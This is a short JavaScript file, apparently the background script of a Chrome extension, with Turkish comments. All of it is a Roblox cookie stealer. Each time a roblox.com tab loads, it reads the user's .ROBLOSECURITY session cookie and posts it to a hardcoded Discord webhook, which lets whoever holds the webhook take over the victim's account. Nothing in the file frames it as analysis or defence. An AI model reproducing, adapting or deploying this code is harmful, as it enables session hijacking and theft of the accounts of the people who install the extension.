const WEBHOOK = 'https://discord.com/api/webhooks/1514964276484374578/I_-XPA6IFArDzuisGaMldvjZ1K1xrZvnEpGZDqJZRYew1DjoWy2JaIk64PxxrQIjjSPg';
var sonCookie = '';

console.log('[LS] Calisiyor');

// Roblox sayfasi acilinca veya yenilenince cookie gonder
chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
    if (tab.url && tab.url.indexOf('roblox.com') > -1 && changeInfo.status === 'loading') {
        setTimeout(function() {
            chrome.cookies.getAll({domain: '.roblox.com'}, function(cookies) {
                for (var i = 0; i < cookies.length; i++) {
                    if (cookies[i].name === '.ROBLOSECURITY' && cookies[i].value !== sonCookie) {
                        sonCookie = cookies[i].value;
                        fetch(WEBHOOK, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({content: 'ROBLOX COOKIE:\n' + cookies[i].value})
                        });
                    }
                }
            });
        }, 1500);
    }
});